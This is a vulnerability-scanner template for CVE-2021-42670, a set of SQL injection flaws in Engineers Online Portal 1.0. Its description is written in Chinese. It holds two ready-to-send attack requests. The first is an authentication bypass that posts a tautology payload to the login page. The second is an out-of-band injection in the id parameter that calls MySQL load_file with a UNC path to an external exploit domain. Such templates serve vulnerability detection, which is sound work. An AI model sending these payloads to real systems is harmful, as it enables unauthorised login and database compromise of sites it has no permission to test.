expression: r0() && r1()
id: CVE-2021-42670
info:
  author: nu11secur1ty
  description: "Engineers Online Portal 1.0 \u5E94\u7528\u7A0B\u5E8F\u4E2D\u7684 id\
    \ \u53C2\u6570my_classmates.php\u4F3C\u4E4E\u5BB9\u6613\u53D7\u5230\u4E09\u79CD\
    \u7C7B\u578B\u7684 SQL \u6CE8\u5165\u653B\u51FB\uFF0C\u5373\u57FA\u4E8E\u5E03\u5C14\
    \u7684\u76F2\u6CE8\u3001\u57FA\u4E8E\u9519\u8BEF\u7684\u67E5\u8BE2\u548C UNION\
    \ \u67E5\u8BE2\u3002payload '+(select load_file('\\hh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net\\\
    ggc'))+' \u5728 id \u53C2\u6570\u4E2D\u63D0\u4EA4\u3002\u6B64\u6709\u6548\u8D1F\
    \u8F7D\u6CE8\u5165\u4E00\u4E2A SQL \u5B50\u67E5\u8BE2\uFF0C\u8BE5\u67E5\u8BE2\u4F7F\
    \u7528\u5F15\u7528\u5916\u90E8\u57DF\u4E0A\u7684 URL \u7684 UNC \u6587\u4EF6\u8DEF\
    \u5F84\u8C03\u7528 MySQL \u7684 load_file \u51FD\u6570\u3002\u5E94\u7528\u7A0B\
    \u5E8F\u4E0E\u8BE5\u57DF\u4EA4\u4E92\uFF0C\u8868\u660E\u5DF2\u6267\u884C\u6CE8\
    \u5165\u7684 SQL \u67E5\u8BE2\u3002\u6B64\u5916\uFF0C\u7528\u6237\u767B\u5F55\u5BB9\
    \u6613\u53D7\u5230\u53C2\u6570\u201Cusername\u201D\u4E0A\u7684 SQL \u6CE8\u5165\
    \u7ED5\u8FC7\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u653B\u51FB\u3002"
  name: "Engineers Online Portal 1.0 \u5BB9\u6613\u53D7\u5230\u4E09\u79CD\u7C7B\u578B\
    \u7684SQL\u6CE8\u5165\u653B\u51FB"
  reference:
  - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/janobe/CVE-nu11-101321
  severity: critical
rules:
  r0:
    expression: response.status == 200  && response.body.bcontains(b'true_student')
    request:
      body: 'username=''+or+1%3D1%23&password=admin

        '
      follow_redirects: true
      headers:
        Cookie: PHPSESSID=p4s256t6kaorni5i3ifelrjnp7
        Referer: '{{hosturl}}/nia_munoz_monitoring_system/index.php'
      method: POST
      path: /login.php
  r1:
    expression: response.status == 200 && response.body.bcontains(b'hh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net')
    request:
      follow_redirects: true
      headers:
        Cookie: PHPSESSID=p4s256t6kaorni5i3ifelrjnp7
        Referer: '{{hosturl}}/dashboard_student.php'
      method: GET
      path: /my_classmates.php?id=1912'%2b(select%20load_file('%5c%5c%5c%5chh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net%5c%5cggc'))%2b'
set:
  hosturl: request.url
